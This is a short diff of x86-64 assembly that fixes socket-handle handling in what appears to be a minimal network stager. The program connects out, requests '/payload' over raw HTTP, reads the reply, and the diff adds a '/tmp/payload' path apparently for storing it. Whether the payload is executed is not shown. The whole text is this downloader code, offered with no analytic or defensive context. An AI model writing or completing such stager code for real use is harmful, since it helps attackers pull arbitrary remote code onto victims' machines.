@@ -14,8 +14,9 @@ _start:
     mov rsi, 1
     xor rdx, rdx
     syscall
+    mov rbx, rax ; save socketfd
 
-    mov rdi, rax ; socketfd
+    mov rdi, rbx ; socketfd
     mov rax, 42 ; sys_connect
     sub rsp, 16
     mov word [rsp], 2
@@ -30,12 +31,14 @@ _start:
 
     ; write(socketfd, request, length)   
     mov rax, 1 
+    mov rdi, rbx
     lea rsi, [rel request]
     mov rdx, request_end - request
     syscall
 
     ; read(socketfd, buffer, length)
     xor rax, rax
+    mov rdi, rbx
     sub rsp, 4096 ; allocate 4096 bytes
     mov rsi, rsp
     mov rdx, 4096
@@ -70,4 +73,7 @@ text_end:
 request:
     db "GET /payload HTTP/1.0", 0x0D, 0x0A, 0x0D, 0x0A ; "GET /payload HTTP/1.0\r\n\r\n"
 request_end:
+
+path:
+    db "/tmp/payload", 0
 
